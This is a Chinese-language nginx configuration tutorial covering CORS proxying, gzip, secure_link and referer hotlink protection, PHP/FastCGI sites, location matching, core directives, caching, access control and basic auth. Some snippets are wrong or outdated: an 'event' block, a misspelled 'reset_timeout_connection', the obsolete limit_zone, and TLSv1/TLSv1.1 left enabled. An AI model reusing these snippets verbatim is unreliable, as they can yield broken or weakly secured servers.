# 接下来在服务器中include enable-cors.conf来引入跨域配置,此文件为项目nginx配置片段,可以直接在nginx config中include(推荐),或copy到现有nginx中,自行配置
# www.helloworld.com域名需配合dns hosts进行配置,其中api开启了cors,需配合本目录下另一份配置文件
upstream front_server{
  server www.helloworld.com:9000;
}
upstream api_server{
  server www.helloworld.com:8080;
}

server {
  listen       80;
  server_name  www.helloworld.com;

  location ~ ^/api/ {
    include enable-cors.conf;
    proxy_pass http://api_server;
    rewrite "^/api/(.*)$" /$1 break;
  }

  location ~ ^/ {
    proxy_pass http://front_server;
  }
}

</textarea>

<h4>压缩和解压缩</h4><pre>
压缩响应通常会显着减少传输数据的大小,然而由于压缩在运行时发生,它还会增加相当大的处理开销,对性能产生负面影响
在向客户端发送响应之前,NGINX会执行压缩,但不会压缩已压缩的响应(例如由代理的服务器)

与大多数其他指令一样,配置压缩的指令可以包含在http上下文中,也可以包含在server或location配置块中

gzip on | off;
启用或禁用gzip压缩响应报文;

gzip_comp_level  level;
压缩比,1-9,默认为1;

gzip_disable regex  ...;
regex是为用于匹配客户端响应器类型的正则表达式;表示对何种浏览器禁止使用压缩功能;

gzip_min_length  length;
触发压缩功能的响应报文的最小长度,指定要压缩的响应的最小长度,默认值为20字节

gzip_http_version  1.0 | 1.1;
设定启用压缩功能时,协议的最小版本;

gzip_proxied # ;
off | expired |  no-cache | no-store | private | no_last_modified | no_etag | auth | any ...;
定义对客户端请求的具有何种请求属性的资源启用压缩功能;如expired则表示对由于使用了expire首部而无法缓存的对象启用压缩功能;

gzip_types  mime-type ...;
指明仅对哪些类型的资源执行压缩操作;即压缩过滤器;
默认情况下NGINX仅使用MIME类型text/html压缩响应,要使用其他MIME类型压缩响应须使用gzip_types指令并列出其他类型

gzip_proxied
默认情况下NGINX不会压缩对代理请求的响应(来自代理服务器的请求)。请求来自代理服务器的事实由请求中Via头字段的存在确定。 要配置这些响应的压缩须使用gzip_proxied指令。
该指令具有多个参数,指定NGINX应压缩哪种代理请求。例如仅对不会在代理服务器上缓存的请求压缩响应是合理的。为此gzip_proxied指令具有指示NGINX在响应中检查Cache-Control头字段的参数,如果值为no-cache,no-store或private则压缩响应。
必须包括Expires参数以用来检查Expires头域的值。 这些参数在以下示例中与auth参数一起设置,该参数检查Authorization头字段的存在(授权响应特定于最终用户,并且通常不被缓存)

</pre><textarea>gzip              on;
gzip_http_version 1.0;
gzip_comp_level   6;
gzip_disable      msie6;
gzip_min_length   1000;
gzip_types        text/plain text/css text/xml application/x-javascript application/xml application/json application/java-script;
gzip_proxied      no-cache no-store private expired auth;

</textarea><pre>
启用解压缩
某些客户端不支持使用gzip编码方法的响应,同时可能需要存储压缩数据,或即时压缩响应并将它们存储在缓存中。为了成功地服务于不接受压缩数据的客户端,NGINX可以在将数据发送到后一种类型的客户端时即时解压缩数据。
要启用运行时解压缩,请使用gunzip指令。
location /storage/ {
  gunzip on;
}
gunzip指令可以在与gzip指令相同的上下文中指定：
server {
  gzip on;
  gzip_min_length 1000;
  gunzip on;
}
</pre>

<h4>防盗链</h4><pre>
【 secure_link指令下载防盗链 】
下载服务器上有众多的软件资源,可是很多来源不是本站,是迅雷、flashget,源源不断的带宽,防盗链绝对是当务之急;使用来源判断根本不靠谱,只能防止一些小白站点的盗链,迅雷之类的下载工具完全无效,使用secure link完美解决这个问题,远离迅雷
仅用于下载服务器,不适用于图片防盗链;需要程序配合,但是效果非常好

secure_link
语法: secure_link md5_hash[,expiration_time]
默认: none
配置段: location
variables: yes
这个指令由uri中的MD5哈希值和过期时间组成,md5哈希必须由base64加密的,过期时间为unix时间,不加过期时间表示这个连接永远都不会过期

secure_link_md5
语法: secure_link_md5 secret_token_concatenated_with_protected_uri
默认: none
配置段: location
variables: yes
md5值对比结果,使用上面提供的uri、密钥、过期时间生成md5哈希值.如果生成的值与用户提交的哈希值一致则这个变量的值为1,否则为0

secure link防盗链原理类似于用户密码验证,不要泄露了密钥,否则别人就可以盗链了,最好能经常更新密钥
下载服务器和php服务器的时间不能相差太大,否则容易出现文件一直都是过期状态
1、用户访问down.php
2、down.php根据secret密钥、过期时间、文件uri生成加密串
3、将加密串与过期时间作为参数跟到文件下载地址的后面
4、nginx下载服务器接收到了过期时间,也使用过期时间、配置里密钥、文件uri生成加密串
5、将用户传进来的加密串与自己生成的加密串进行对比,一致允许下载,不一致403

默认nginx不会安装secure_link模块,需要手动指定,配置参数如下
 # ./configure --with-http_secure_link_module \
 --prefix=/usr/local/nginx-1.4.2 --with-http_stub_status_module
 # make
 # make install

</pre><textarea>server {
  listen       80;
  server_name  s1.down.ttlsa.com;
  access_log  /data/logs/nginx/s1.down.ttlsa.com.access.log  main;
  index index.html index.php index.html;
  root /data/site/s1.down.ttlsa.com;
  
  location / {
    secure_link $arg_st,$arg_e;
    secure_link_md5 ttlsa.com$uri$arg_e;
    if ($secure_link = "") {
      return 403;
    }
    if ($secure_link = "0") {
      return 403;
    }
  }
}

php下载页面生成nginx secure link链接
$secret = 'ttlsa.com';             # 密钥
$path = '/web/nginx-1.4.2.tar.gz'; # 下载文件
$expire = time()+300;              # 下载到期时间,从现在到300秒之内文件不过期
# 用文件路径、密钥、过期时间生成加密串
$md5 = base64_encode(md5($secret . $path . $expire,true));
$md5 = strtr($md5,'+/','-_');
$md5 = str_replace('=','',$md5);
# 加密后的下载地址
echo '＜a href=http://s1.down.ttlsa.com/web/nginx-1.4.2.tar.gz?st='.$md5.'&e='.$expire.'＞nginx-1.4.2＜/a＞';
echo '＜br＞http://s1.down.ttlsa.com/web/nginx-1.4.2.tar.gz?st='.$md5.'&e='.$expire;

测试nginx防盗链
打开http://test.ttlsa.com/down.php点击上面的连接下载
下载地址如下：
http://s1.down.ttlsa.com/web/nginx-1.4.2.tar.gz?st=LSVzmZllg68AJaBmeK3E8Q&e=1378881984
页面不要刷新,等到5分钟后在下载一次,会发现点击下载会跳转到403页面。

</textarea><pre>
【 referer指令图片防盗链配置 】
nginx模块ngx_http_referer_module通常用于阻挡来源非法的域名请求,伪装Referer头部是非常简单的事情,所以这个模块只能用于阻止大部分非法请求,有些合法的请求是不会带referer来源头部的,所以有时候不要拒绝来源头部referer为空的请求

referer指令不需要程序配合,根据图片来源来实现,但只能先限制基本的图片盗用,无法防止图片采集

</pre><textarea># 所有来自ttlsa.com或ttlsa.cn和域名中包含google和baidu的站点都可以访问到当前站点的图片,如果来源域名不在这个列表中,那么$invalid_referer等于1,在if语句中返回一个403给用户,这样用户便会看到一个403的页面,如果使用下面的rewrite,那么盗链的图片都会显示403.jpg或403.html。如果用户直接在浏览器输入图片地址,那么图片显示正常,因为它符合none这个规则
location ~* \.(gif|jpg|png|bmp)$ {
  valid_referers none blocked *.ttlsa.com *.ttlsa.cn server_names ~\.google\. ~\.baidu\.;
  if ($invalid_referer) {
    return 403;
    #rewrite ^/ http://www.ttlsa.com/403.jpg;
    #rewrite ^/ http://www.ttlsa.com/403.html;
  }
}

</textarea><pre>
referer_hash_bucket_size size;
默认值: referer_hash_bucket_size 64;
配置段: server,location
Sets the bucket size for the valid referers hash tables. The details of setting up hash tables are provided in a separate document.

referer_hash_max_size size;
默认值:     referer_hash_max_size 2048;
配置段:     server,location
Sets the maximum size of the valid referers hash tables. The details of setting up hash tables are provided in a separate document.

valid_referers none | blocked | server_names | string ...;
默认值: —
配置段: server,location
ngx_http_referer_module模块调用配置,基于请求报文中的Referer首部的值做访问控制
指定合法的来源'referer',该指令决定了内置变量$invalid_referer的值,如果referer头部包含在这个合法网址里面,这个变量被设置为0,否则设置为1,不区分大小写的

内置变量：$invalid_referer(所有不能符合valid_referer指定定义的引用请求均为不合法引用),需加上条件判断语句

参数说明
none 请求报文不存在referer首部;
blocked 请求报文中存在referer首部即不为空,但其没有有效值里面的值被代理或防火墙删除修改了,或其值不以http://或https://开头;
server_names 其值为一个主机名,"Referer"来源头部包含当前的server_names(当前域名),允许文件资源链出的域名白名单
arbitrary string 任意字符串,定义服务器名或可选的URI前缀,可以使用*通配符,主机名可使用*开头或结尾,在检测来源头部这个过程中来源域名中的主机端口将会被忽略掉
regular expression 以~起始的正则表达式,~表示排除https://或http://开头的字符串

</pre><pre>
【 ngx_http_stub_status_module模块调用配置：stub_status指令调用查看nginx状态指 】
通过指定的uri输出stub status

</pre>设定查看Nginx状态的地址<textarea>location /NginxStatus {
  stub_status on;
  access_log on;
  # auth_basic "NginxStatus:please input name and passwd";  # 需要进行身份认证,提供用户名密码
  # auth_basic_user_file conf/htpasswd;
}

输出结果：
Active connections 当前活动的客户端连接数：291
accepts            已经接受的客户端连接总数量：16630948
handled            已经处理过后客户端连接总数量：16630948
requests           客户端的总的请求数量：31070465
Readking           正在读取的客户端请求的数量
Writing            正向其发送响应报文的连接数量
Waiting            等待其发出请求的空闲连接数量

</textarea>
</div>

<div id="nginx_php">
<h3>PHP站点配置</h3><textarea>server {
  listen      80;
  server_name example.org www.example.org;
  root        /data/www;

  location / {
    index   index.html index.php;
  }

  location ~* \.(gif|jpg|png)$ {
    expires 30d;
  }

  location ~ \.php$ {
    fastcgi_pass  localhost:9000;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    include       fastcgi_params;
  }
}

</textarea><textarea>server {
  listen       80;
  server_name  127.0.0.1;
  root         E:/w7;

  location / {
    index  index.html index.htm index.php;
    try_files $uri $uri/ /index.php;
    #if (!-e $request_filename) {
    #  rewrite  ^(.*)$  /index.php?$1  last;
    #  break;
    #}
  }

  # pass the PHP scripts to FastCGI server listening on 127.0.0.1:9000
  location ~ \.php$ {
    fastcgi_pass   127.0.0.1:9000;
    fastcgi_index  index.php;
    fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
    include        fastcgi_params;
    fastcgi_read_timeout 300;  # 防止php执行大量数据库操作时出现504超时
  }
}

</textarea><pre>
首先nginx使用前缀匹配找出最准确的location,这一步nginx会忽略location在配置文件出现的顺序。上面的配置中,唯一的前缀匹配location是"/",而且因为它可以匹配任意的请求,所以被作为最后一个选择。接着nginx继续按照配置中的顺序依次匹配正则表达式的location,匹配到第一个正则表达式后停止搜索。匹配到的location将被使用。如果没有匹配到正则表达式的location,则使用刚刚找到的最准确的前缀匹配的location。

所有location匹配测试只使用请求的URI部分,而不使用参数部分,这是因为写参数的方法很多
/index.php?user=john&page=1
/index.php?page=1&user=john
除此以外,任何人在请求串中都可以随意添加字符串：
/index.php?page=1&something+else&user=john

现在来看使用上面的配置,请求是怎样被处理的：
1、请求"/logo.gif"首先匹配location "/",然后匹配上正则表达式"\.(gif|jpg|png)$"。因此它将被后者处理。根据"root /data/www"指令,nginx将请求映射到文件/data/www/logo.gif,并发送这个文件到客户端。
2、请求"/index.php"首先也匹配上location "/",然后匹配上正则表达式"\.php$"。因此它将被后者处理,进而被发送到监听在localhost:9000的FastCGI服务器。fastcgi_param指令将FastCGI的参数SCRIPT_FILENAME的值设置为"/data/www/index.php",接着FastCGI服务器执行这个文件。变量$document_root等于root指令设置的值,变量$fastcgi_script_name的值是请求的uri,"/index.php"。
3、请求"/about.html"仅能匹配上location "/",因此它将使用此location进行处理。根据"root /data/www"指令,nginx将请求映射到文件"/data/www/about.html",并发送这个文件到客户端。
4、请求"/"的处理更为复杂。它仅能匹配上location "/",因此它将使用此location进行处理。然后index指令使用它的参数和"root /data/www"指令所组成的文件路径来检测对应的文件是否存在。如果文件/data/www/index.html不存在,而/data/www/index.php存在,此指令将执行一次内部重定向到"/index.php",接着nginx将重新寻找匹配"/index.php"的location,就好像这次请求是从客户端发过来一样。正如我们之前看到的那样,这个重定向的请求最终交给FastCGI服务器来处理。

【 设置FastCGI代理 】
nginx可用于将请求路由到运行使用各种框架和PHP等编程语言构建的应用程序的FastCGI服务器。
使用FastCGI服务器的最基本nginx配置包括使用fastcgi_pass指令(而不是proxy_pass指令)及fastcgi_param指令来设置传递给FastCGI服务器的参数。假设FastCGI服务器可以在localhost:9000上访问,fastcgi_pass指令参数改为localhost:9000,在PHP中SCRIPT_FILENAME参数用于确定脚本名称,QUERY_STRING参数用于传递请求参数

</pre><textarea># 设置一个服务器,将除静态图像请求之外的所有请求路由到通过FastCGI协议在localhost:9000上运行的代理服务器
server {
  location / {
    fastcgi_pass  localhost:9000;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    fastcgi_param QUERY_STRING    $query_string;
  }

  location ~ \.(gif|jpg|png)$ {
    root /data/images;
  }
}

</textarea><textarea>#PHP脚本请求全部转发到FastCGI(php-fpm)处理,使用FastCGI默认配置
location ~ \.php$ {
  fastcgi_pass 127.0.0.1:9000;
  fastcgi_index index.php;
  fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
  include fastcgi_params;
}

</textarea><textarea>实际使用中至少有三个匹配规则定义：
#直接匹配网站根,直接转发给后端应用服务器了,也可以是一个静态首页,通过域名访问网站首页比较频繁,使用这个会加速处理,官网如是说
location = / {
  proxy_pass http://tomcat:8080/index
}
#处理静态文件请求,这是nginx作为http服务器的强项,有两种配置模式,目录匹配或后缀匹配,任选其一或搭配使用
location ^~ /static/ {
  root /webroot/static/;
}
location ~* \.(gif|jpg|jpeg|png|css|js|ico)$ {
  root /webroot/res/;
}
#通用规则用来转发动态请求到后端应用服务器,非静态文件请求就默认是动态请求,自己根据实际把握,毕竟目前的一些框架的流行,带.php,.jsp后缀的情况很少了
location / {
  proxy_pass http://tomcat:8080/
}

</textarea>
</div>

<div id="nginx_conf">
<h3>nginx配置</h3><pre>
nginx使用最多的三个核心功能是反向代理、负载均衡和静态服务器,都跟nginx的配置密切相关,nginx服务器的配置信息主要集中在nginx.conf配置文件中

Nginx的配置系统由一个主配置文件和其他辅助的配置文件构成,这些配置文件均是纯文本文件,全部位于Nginx安装目录下的conf目录下
主配置文件：nginx.conf
在主配置文件中加入include语句,可以将主配置文件切割,例如include conf.d/*.conf -> /etc/nginx/conf.d/*.conf
fastcgi的配置文件：fastcgi_params或fastcgi.conf

配置文件中以#开始的行或前面有若干空格或TAB再跟#的行都被认为是注释

配置文件内容语法格式
1) 配置指令(分号结尾)：Directive value1 [value2...];
2) 支持使用变量：
内置变量：由模块引入;
自定义变量：set variable value; 
引用变量：$variable

【 修改hosts文件 】
windows方式C:\Windows\System32\Drivers\etc\hosts
192.168.1.201 a.ttlsa.com
192.168.1.201 b.ttlsa.com

linux方式
echo "192.168.1.201 a.ttlsa.com 192.168.1.201 b.ttlsa.com" >> /etc/hosts

【 配置文件主要由6个部分组成 】
main
用于进行nginx全局信息的配置,nginx运行时与具体业务功能(如http服务或email服务代理)无关的一些参数,如工作进程数、运行的身份等
user、worker_processes、error_log、events、http、mail

events
用于nginx工作模式的配置

http
与提供http服务相关的一些配置参数,如是否使用keepalive、是否使用gzip进行压缩等
server

server
http服务上支持若干虚拟主机,每个虚拟主机一个对应的server配置项,配置项里面包含该虚拟主机相关的配置。
在提供mail服务的代理时,也可以建立若干server,每个server通过监听的地址来区分
listen、server_name、access_log、location、protocol、proxy、smtp_auth、xclient

location
用于进行访问路由的配置,http服务中某些特定的URL对应的一系列配置项
index、root

upstream
用于进行负载均衡的配置

mail
实现email相关的SMTP/IMAP/POP3代理时共享的一些配置项,因为可能实现多个代理,工作在多个监听地址上
server、auth_http、imap_capabilities

</pre><textarea>user  nobody;
worker_processes  1;
error_log  logs/error.log  info;

events {
  worker_connections  1024;
}

http {
  server {
    listen          80;
    server_name     www.linuxidc.com;
    access_log      logs/linuxidc.access.log main;
    location / {
      index index.html;
      root  /var/www/linuxidc.com/htdocs;
    }
  }

  server {
    listen          80;
    server_name     www.Androidj.com;
    access_log      logs/androidj.access.log main;
    location / {
      index index.html;
      root  /var/www/androidj.com/htdocs;
    }
  }
}

mail {
  auth_http  127.0.0.1:80/auth.php;
  pop3_capabilities  "TOP"  "USER";
  imap_capabilities  "IMAP4rev1"  "UIDPLUS";

  server {
    listen     110;
    protocol   pop3;
    proxy      on;
  }
  server {
    listen      25;
    protocol    smtp;
    proxy       on;
    smtp_auth   login plain;
    xclient     off;
  }
}

</textarea>

<h4>main模块：全局配置模块中的配置项</h4><pre>
正常运行必备的配置;优化性能相关的配置;用于调试、定位问题的配置;

# user和pid应该按默认设置
user USERNAME [GROUPNAME];
指定用于运行worker进程的用户和组,例如user nginx nginx;默认nobody账号运行,user nobody;

pid  /var/run/nginx.pid;
指定nginx进程的pid文件路径;

worker_rlimit_nofile 100000
指定一个worker进程能够打开的最大打开文件数限制,默认值为操作系统的限制。设置后操作系统和Nginx可以处理比"ulimit -a"更多的文件,所以把这个值设高nginx就不会有"too many open files"问题了

worker_rlimit_sigpending  #;
指定每个用户能够发往worker进程的信号的数量;

worker_processes auto;
定义了nginx对外提供web服务时的worder进程数
最优值取决于许多因素,包括但不限于CPU核的数量、存储数据的硬盘数量及负载模式。不能确定时通常设置成和CPU的数量相等,设置为"auto"将尝试自动检测
运行过程中监控每个进程消耗内存(一般几M~几十M不等)根据实际情况进行调整

worker_cpu_affinity  CPUMASK CPUMASK …;
CPU绑定;加上CPU掩码;实例：worker_cpu_affinity 00000001 00000010 00000100;
worker_priority nice;

daemon off|on;
是否以守护进程方式启动nignx;

master_process on|off;
是否以master/worker模型运行nginx;

error_log /PATH/TO/ERROR_LOG level;
错误日志文件及其级别,调试需要可以设定为debug,但debug在编译时使用了"--with-debug"选项
debug / info / notice / warn / error / crit

</pre><textarea># user nobody;
worker_processes 1;
# error_log logs/error.log
# error_log logs/error.log notice
# error_log logs/error.log info
pid logs/nginx.pid
worker_rlimit_nofile 1024;

</textarea>

<h4>event模块：nginx服务器的工作模式</h4><pre>
事件驱动模块,面向用户并发连接请求响应组织配置机制

worker_connections 1024;
每个worker进程所能够响应的最大并发请求数量,即由一个worker进程同时打开的最大连接数;默认1024;

multi_accept on;
指定nginx在收到一个新连接通知后尽可能多的接受更多的连接

use  [epoll|rgsig|select|poll];
定义使用的事件模型;建议让nginx自动选择
设置用于复用客户端线程的轮询方法,如果是linux2.6+使用epoll,epoll是多路复用IO(I/O Multiplexing)中的一种方式,如果是BSD如Mac使用Kqueue

accept_mutex [on|off];
各worker接收用户的请求的负载均衡锁(互斥锁);on启用表示用于让多个worker轮流地、序列化地响应新请求

lock_file /PATH/TO/LOCK_FILE;
锁文件位置

</pre><textarea>event {
  worker_connections 1024;
  multi_accept on;
  use epoll;
}

</textarea><pre>
并发总数是worker_processes和worker_connections的乘积,即max_clients=worker_processes * worker_connections
在设置了反向代理的情况下max_clients = worker_processes * worker_connections / 4,4是一个经验值
根据以上条件,正常情况下的Nginx Server可以应付的最大连接数为：4 * 8000 = 32000
worker_connections值的设置跟物理内存大小有关,因为并发受IO约束,max_clients的值须小于系统可以打开的最大文件数,而系统可以打开的最大文件数和内存大小成正比,一般1GB内存的机器上可以打开的文件数大约是10万左右
看看360M内存的VPS可以打开的文件句柄数是多少：
$ cat /proc/sys/fs/file-max,输出34336
32000 < 34336,即并发连接总数小于系统可以打开的文件句柄总数,这样就在操作系统可以承受的范围之内
所以worker_connections的值需根据worker_processes进程数目和系统可以打开的最大文件总数进行适当地进行设置,使得并发总数小于操作系统可以打开的最大文件数目,其实质也就是根据主机的物理CPU和内存进行配置
当然理论上的并发总数可能会和实际有所偏差,因为主机还有其他的工作进程需要消耗系统资源。

</pre>

<h4>http模块 ngx_http_core_module模块配置</h4><pre>
作为web服务器,http模块是nginx最核心的模块,项目中会设置到很多的实际业务场景,需要根据硬件信息进行适当的配置,常规情况下使用默认配置即可

Syntax:  default_type mime-type;
Default: default_type text/plain;
Context: http,server,location

【 面向客户端请求相关的配置 】
(1) keepalive_timeout # ;
设定keepalive连接的超时时长;0表示禁止长连接;默认为启用为75s;

(2) keepalive_requests # ;
在keepalived连接上所允许请求的最大资源数量;默认为100;

(3) keepalive_disable … ….;
指明禁止为何种浏览器使用keepalive功能;默认none,也可以指明具体浏览器名称

(4) send_timeout #;
发送响应报文的超时时长,默认为60s;

(5) client_body_buffer_size size;
接收客户请求报文body的缓冲区大小;默认为16k;超出此指定大小时将被移存于磁盘上;

(6) client_body_temp_pathpath [level1 [level2 [level3]]];
设定用于存储客户端请求body的临时存储路径及子目录结构和数量;
client_body_temp_path  /var/tmp/client_body  2 2;

【 对客户端请求进行限制 】
(1) limit_excepet  METHOD {...}：对指定范围之外的其它的方法进行访问控制;
limit_except  GET {
  allow  172.16.0.0/16;
  deny all;
}

(2) limit_rate  # ;
制客户端每秒钟所能够传输的字节数,默认为0表示无限制

【 文件操作(缓存)优化相关配置 】
当启用缓存时NGINX将响应保存在磁盘缓存中,并使用它们来响应客户端,而不必每次都为同一内容代理请求

aio on|off
是否启用异步io模式

directio  size|off;
直接IO;不在内存中缓冲,直接从硬盘加载使用(当大于指定size)
Enablesthe use of the O_DIRECT flag (FreeBSD,Linux),the F_NOCACHE flag (Mac OS X),or the directio() function (Solaris),when reading files that are larger thanor equal to the specified size

open_file_cache
打开文件缓存,打开缓存的同时也指定了缓存最大数目及缓存的时间
可以设置一个相对高的最大时间,这样可以在它们不活动超过20秒后清除掉
open_file_cache off;
open_file_cache max=N [inactive=time];

nginx可以缓存以下三种信息
1)文件描述符、文件大小和最近一次的修改时间;
2)打开的目录的结构;
3)没有找到的或没有权限操作的文件的相关信息;
max=N表示可缓存的最大条目上限,一旦达到上限则会使用LRU算法从缓存中删除最近最少使用的缓存项;
inactive=time：在此处指定的时长内没有被访问过的缓存项是为非活动缓存项,因此直接删除

open_file_cache_valid #
每隔多久检查一次缓存中缓存项的有效性,默认60s,在open_file_cache中指定检测正确信息的间隔时间。

open_file_cache_min_uses #
缓存项在非活动期限内最少应该被访问的次数,定义了open_file_cache中指令参数不活动时间期间里最小的文件数。

open_file_cache_errors on | off
是否缓存找不到其路径的文件,或没有权限没有权限访问的文件相关信息
指定当搜索一个文件时是否缓存错误信息,也包括再次给配置中添加文件,也包括了服务器模块,这些是在不同文件中定义的。如果服务器模块不在这些位置就得修改这一行来指定正确的位置。

open_file_cache_errorson | off;
是否缓存找不到其路径的文件,或没有权限访问的文件相关信息

缓存
反向代理主要是缓存东西,以便减少并发操作

</pre>proxy_cache参考范例<textarea>location ~ .*\.html${
  proxy_next_upstream http_502 http_504 error timeout invalid_header;
  proxy_cache cache_one;
  proxy_cache_valid 200 304 12h;
  proxy_cache_valid 301 302 1m;
  proxy_cache_valid any 1m;
  proxy_cache_key $host$uri$is_args$args;
  proxy_set_header Host $host;
  proxy_set_header X-Forwarded-For $remote_addr;
  proxy_set_header Accept-Encoding "";
  proxy_ignore_headers "Cache-Control" "Expires";
  proxy_pass http://backend_server;
  expires 5d;
}

</textarea><pre>
【 ngx_http_headers_module模块add_header和expires指令 】
ngx_http_headers_module模块提供了两个重要的指令add_header和expires,添加Expires和Cache-Control头字段,对响应头添加任何域字段。add_header可以用来标示请求访问到哪台服务器上,这个也可以通过nginx模块nginx-http-footer-filter研究使用来实现。expires指令用来对浏览器本地缓存的控制

add_header指令
语法: add_header name value;
默认值: —
配置段: http,server,location,if in location
对响应代码为200,201,204,206,301,302,303,304或307的响应报文头字段添加任意域,如add_header From ttlsa.com

三. expires指令
语法: expires [modified] time;
expires epoch | max | off;
默认值: expires off;
配置段: http,server,location,if in location
在对响应代码为200,201,204,206,301,302,303,304或307头部中是否开启对"Expires"和"Cache-Control"的增加和修改操作。
可以指定一个正或负的时间值,Expires头中的时间根据目前时间和指令中指定的时间的和来获得。

epoch表示自1970年1月1日00:00:01 GMT的绝对时间,max指定Expires的值为2037年12月31日23:59:59,Cache-Control的值为10 years。
Cache-Control头的内容随预设的时间标识指定：
·设置为负数的时间值:Cache-Control: no-cache。
·设置为正数或0的时间值：Cache-Control: max-age = #,这里#的单位为秒,在指令中指定。
参数off禁止修改应答头中的"Expires"和"Cache-Control"。

</pre><textarea># 对图片、flash文件在浏览器本地缓存30天
location ~ .*\.(gif|jpg|jpeg|png|bmp|swf)$ {
  expires 30d;
}

# 对js、css文件在浏览器本地缓存1小时
location ~ .*\.(js|css)$ {
  expires 1h;
}

</textarea><pre>
【 allow、deny(ngx_http_access_module)基于ip的访问控制 】
在实际生产环境中也会使用nginx的geo模块配合使用

语法: allow address | CIDR | unix: | all;
语法:  deny address | CIDR | unix: | all;
默认值: —
配置段: http,server,location,limit_except
允许/禁止某个ip或一个ip段访问,指定unix:将允许/禁止socket的访问

</pre><textarea># 从上到下的顺序,类似iptables,匹配到了便跳出。
# 先禁止了192.16.1.1,接下来允许了3个网段,其中包含了一个ipv6,最后未匹配的IP全部禁止访问
location / {
  deny  192.168.1.1;
  allow 192.168.1.0/24;
  allow 10.1.1.0/16;
  allow 2001:0db8::/32;
  deny  all;
}

# 不允许访问项目下的.htaccess文件,deny all拒绝所有请求
location ~ /.ht {
  deny all;
}

</textarea><pre>
【 ngx_http_auth_basic_module模块调用配置(basic认证) 】
(1) auth_basic string |off;       # 使用httpbasic认证协议对用户进行认证,string在认证时显示提示所信息
(2) auth_basic_user_file FILE;    # 实现用户认证的账号文件

认证文件格式(需手动创建,密码需要加密,加密方式可以为encryptedwith the crypt() function; md5加密)：
name1:password1
name2:password2:comment

密码可以用htpasswd创建：htpasswd-c -m /etc/nginx/.ngxhtpasswd tom(创建第二个用户时需要将-c去掉)
htpasswd是开源http服务器apache httpd的一个命令工具,用于生成http基本认证的密码文件
在线生成：http://tool.oschina.net/htpasswd
md5 admin:admin -> admin:$apr1$PL//TfEq$mNd5OHtG49BA/vYFgVjWU.
crypt admin:admin -> admin:eOjJahHh0/Lu6

nginx的http auth basic的密码是用crypt(3)加密的

</pre><textarea>location /admin/ {
  auth_basic "please input name and passwd";
  auth_basic_user_file /data/server/nginx/passwd.db;
}

</textarea><textarea>http {
  # 文件扩展名与文件类型映射表,设定mime类型,类型由mime.type文件定义
  include /etc/nginx/mime.types;
  # 指定默认处理的文件类型可以是二进制
  default_type application/octet-stream;
  # 设置头文件中的默认的字符集
  charset UTF-8;

  # 关闭在错误页面中的nginx版本数字,这样对于安全性是有好处的
  server_tokens off;
  # sendfile指令指定nginx是否调用sendfile函数(zero copy方式)来输出文件,对于普通应用必须设为on,将文件的回写过程交给数据缓冲去完成,而不是放在应用中完成,对性能提升有有好处
  # 如果用来进行下载等应用磁盘IO重负载应用可设置为off,以平衡磁盘与网络I/O处理速度,降低系统的uptime
  # sendfile()可以在磁盘和TCP socket之间互相拷贝数据(或任意两个文件描述符)。Pre-sendfile是传送数据之前在用户空间申请数据缓冲区。之后用read()将数据从文件拷贝到这个缓冲区,write()将缓冲区数据写入网络。sendfile()是立即将数据从磁盘读到OS缓存。因为这种拷贝是在内核完成的,sendfile()要比组合read()和write()以及打开关闭丢弃缓冲更加有效
  #静态文件直接在内核中封装响应,而不是从内核空间到用户空间再发往内核空间
  sendfile on;
  # 让nginx在一个数据包中发送所有的头文件,而不是一个一个单独发,是否启用TCP_NOPUSH(FREEBSE)或TCP_CORK(Linux)选项;仅在sendfile为on时有用
  tcp_nopush on;
  # 让nginx不缓存数据而是一段段发送,如果数据传输有实时性的要求则可配置它,发送完一小段数据就立刻能得到返回值,但不要滥用
  tcp_nodelay on;

  # 将timeout设低来防止DOS攻击
  # 给客户端分配keep_alive连接超时时间,服务器会在这个时间过后关闭连接。一般设置时间较短可以让nginx工作持续性更好
  keepalive_timeout 65;
  # 设置请求头的超时时间
  # client_header_timeout 10;
  # 设置请求体的超时时间
  # client_body_timeout 10;
  # 指定客户端响应超时时间,如果客户端两次操作间隔超过这个时间,在这段时间内,客户端没有读取任何数据服务器就会关闭这个链接
  # send_timeout 10;
  # 告诉nginx关闭不响应的客户端连接,这将会释放那个客户端所占有的内存空间
  reset_timeout_connection on;

  # 限制用户连接数来预防DOS攻击
  limit_zone slimits $binary_remote_addr 5m;
  limit_conn slimits 5;

  # 设置用于保存各种key(比如当前连接数)的共享内存的参数,5m是5兆字节,这个值应该被设置的足够大以存储(32K*5)32byte状态或(16K*5)64byte状态
  # limit_conn_zone $binary_remote_addr zone=addr:5m;
  # 给定的key设置最大连接数,这里key是addr,这里设置的值是100,也就是说允许每一个IP地址最多同时打开有100个连接
  # limit_conn addr 100;

  # 混淆数据,影响三列冲突率,值越大消耗内存越多,散列key冲突率会降低,检索速度更快;值越小key,占用内存较少,冲突率越高,检索速度变慢
  types_hash_max_size 2048;

  # server_names_hash_bucket_size 64;
  # server_name_in_redirect off;

  ### SSL证书配置
  # 指令用于启动特定的加密协议,nginx在1.1.13和1.0.12版本后默认是ssl_protocols SSLv3 TLSv1 TLSv1.1 TLSv1.2,TLSv1.1与TLSv1.2要确保OpenSSL >= 1.0.1 ,SSLv3现在还有很多地方在用但有不少被攻击的漏洞
  ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # Dropping SSLv3,ref: POODLE
  # 设置协商加密算法时,优先使用服务端的加密套件,而不是客户端浏览器的加密套件
  ssl_prefer_server_ciphers on;

  ### 日志配置
  # 设定日志格式,一般通过调用内置变量来定义
  # log_format name string  ...; 定义日志格式及 名称
  # string通过nginx所支持的变量(每个模块会引入自变量)来支持的
  # log_format main '$remote_addr - $remote_user [$time_local] "$request" '
                    '$status $body_bytes_sent "$http_referer" '
                    '"$http_user_agent" "$http_x_forwarded_for"';
  # 设置存储访问记录的日志
  access_log /var/log/nginx/access.log;
  # 设置存储记录错误发生的日志
  error_log /var/log/nginx/error.log;

  ### gzip压缩配置
  # 告诉nginx采用gzip压缩的形式发送数据,这将会减少发送的数据量,gzip压缩功能可节省带宽,但是会增加服务器CPU的开销,Nginx默认只对text/html进行压缩,如果要对html之外的内容进行压缩传输,需要手动配置gzip_types
  gzip on;
  # 设置需要压缩的数据格式
  # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript;
